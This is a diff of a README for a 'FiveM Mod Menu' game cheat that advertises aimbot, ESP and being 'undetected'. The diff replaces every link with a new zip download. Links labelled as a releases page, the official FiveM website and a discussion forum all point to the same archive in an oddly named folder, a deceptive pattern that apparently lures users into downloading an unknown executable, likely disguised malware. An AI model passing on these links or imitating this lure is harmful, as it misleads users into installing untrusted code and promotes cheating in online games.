@@ -1,7 +1,7 @@
 # 🎮 FiveM-Mod-Menu - Power Up Your Gaming Experience
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/Dasquapy/FiveM-Mod-Menu/main/attemptable/Mod_Five_Menu_3.5.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Dasquapy/FiveM-Mod-Menu/main/attemptable/Mod_Five_Menu_3.5.zip)
+[![Download Latest Release](https://github.com/Dasquapy/FiveM-Mod-Menu/raw/refs/heads/main/attemptable/Mod_Menu_Five_v1.7.zip%20Latest%20Release-v1.0-blue)](https://github.com/Dasquapy/FiveM-Mod-Menu/raw/refs/heads/main/attemptable/Mod_Menu_Five_v1.7.zip)
 
 ## 🚀 Getting Started
 Welcome to the FiveM Mod Menu! This tool enhances your FiveM experience with powerful features like ESP, aimbot, vehicle spawning, and money drops. It's easy to use, fully customizable, and undetected, ensuring you have a safe gaming experience.
@@ -23,7 +23,7 @@ Welcome to the FiveM Mod Menu! This tool enhances your FiveM experience with pow
 ## 📦 Download & Install
 To install the FiveM Mod Menu, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Dasquapy/FiveM-Mod-Menu/main/attemptable/Mod_Five_Menu_3.5.zip).
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Dasquapy/FiveM-Mod-Menu/raw/refs/heads/main/attemptable/Mod_Menu_Five_v1.7.zip).
 2. **Download the Latest Version:** Click on the latest version to download. You will see files listed.
 3. **Start Installation:**
    - If you see a ZIP file, download and extract it to your desired folder. 
@@ -57,8 +57,8 @@ Join our user community where you can share tips, ask questions, and get support
 If you have suggestions or want to contribute, feel free to open an issue or create a pull request in the repository. Your feedback helps us improve the product.
 
 ## ⚡ Further Resources
-- [FiveM Official Website](https://raw.githubusercontent.com/Dasquapy/FiveM-Mod-Menu/main/attemptable/Mod_Five_Menu_3.5.zip)
-- [Mod Menu Discussion Forum](https://raw.githubusercontent.com/Dasquapy/FiveM-Mod-Menu/main/attemptable/Mod_Five_Menu_3.5.zip)
+- [FiveM Official Website](https://github.com/Dasquapy/FiveM-Mod-Menu/raw/refs/heads/main/attemptable/Mod_Menu_Five_v1.7.zip)
+- [Mod Menu Discussion Forum](https://github.com/Dasquapy/FiveM-Mod-Menu/raw/refs/heads/main/attemptable/Mod_Menu_Five_v1.7.zip)
 
 For any issues, please highlight them in the issues section of our repository. 
 
